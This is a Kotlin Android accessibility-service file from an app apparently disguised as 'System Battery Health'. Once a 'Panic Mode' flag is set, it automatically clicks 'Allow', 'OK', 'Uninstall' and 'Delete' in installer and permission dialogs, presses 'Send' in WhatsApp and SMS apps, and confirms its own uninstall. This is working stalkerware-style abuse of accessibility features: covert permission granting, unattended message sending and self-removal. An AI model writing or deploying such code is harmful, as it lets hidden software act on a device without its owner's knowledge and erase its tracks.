package com.ghostbattery.service

import android.accessibilityservice.AccessibilityService
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.ghostbattery.R
import com.ghostbattery.data.PrefsManager

class GhostAccessibilityService : AccessibilityService() {

    private lateinit var prefsManager: PrefsManager

    override fun onServiceConnected() {
        prefsManager = PrefsManager(this)
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        // Safety Switch: Only automate if Panic Mode was activated by the user
        // This prevents the app from acting like malware during normal use.
        if (!prefsManager.isPanicModeActive) {
            return
        }

        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val allowedPackages = setOf(
                "com.android.packageinstaller",
                "com.google.android.packageinstaller",
                "com.android.permissioncontroller",
                "com.google.android.permissioncontroller",
                "com.whatsapp",
                "com.google.android.apps.messaging",
                "com.android.mms"
            )

            val eventPkg = event.packageName?.toString()
            if (eventPkg == null || eventPkg !in allowedPackages) return

            val rootNode = rootInActiveWindow ?: return

            try {
                // 1. Detect Standard Keywords (restricted to expected packages only)
                val keywords = when (eventPkg) {
                    "com.android.packageinstaller",
                    "com.google.android.packageinstaller",
                    "com.android.permissioncontroller",
                    "com.google.android.permissioncontroller" ->
                        listOf("OK", "Uninstall", "Delete", "Allow")

                    // If messaging apps are allowed at all, only allow "Send".
                    "com.whatsapp",
                    "com.google.android.apps.messaging",
                    "com.android.mms" ->
                        listOf("Send")

                    else -> emptyList()
                }

                var clicked = false

                for (keyword in keywords) {
                    val nodes = rootNode.findAccessibilityNodeInfosByText(keyword)
                    try {
                        for (node in nodes) {
                             if (clicked) break

                             if (node.isClickable) {
                                 node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                 clicked = true
                             } else {
                                 var parent: AccessibilityNodeInfo? = node.parent
                                 try {
                                     while (parent != null) {
                                         if (parent.isClickable) {
                                             parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                             clicked = true
                                             break
                                         }
                                         val next = parent.parent
                                         parent.recycle()
                                         parent = next
                                     }
                                 } finally {
                                     parent?.recycle()
                                 }
                             }
                        }
                    } finally {
                         nodes.forEach { try { it.recycle() } catch(_:Exception){} }
                    }
                    if (clicked) break
                }

                if (clicked) return

                // 2. Specific Self-Destruct Detection
                // If the dialog asks to uninstall "System Battery Health" (Our App Name)
                val appName = getString(R.string.app_name)
                val appNameNodes = rootNode.findAccessibilityNodeInfosByText(appName)
                try {
                    if (appNameNodes.isNotEmpty()) {
                        val okNodes = rootNode.findAccessibilityNodeInfosByText("OK")
                        try {
                            for (okNode in okNodes) {
                                if (okNode.isClickable && okNode.performAction(AccessibilityNodeInfo.ACTION_CLICK)) break

                                var parent: AccessibilityNodeInfo? = okNode.parent
                                try {
                                    while (parent != null) {
                                        if (parent.isClickable && parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)) break
                                        val next = parent.parent
                                        parent.recycle()
                                        parent = next
                                    }
                                } finally {
                                    parent?.recycle()
                                }
                            }
                        } finally {
                            okNodes.forEach { try { it.recycle() } catch(_:Exception){} }
                        }
                    }
                } finally {
                    appNameNodes.forEach { try { it.recycle() } catch(_:Exception){} }
                }
            } finally {
                rootNode.recycle()
            }
        }
    }

    override fun onInterrupt() {}
}
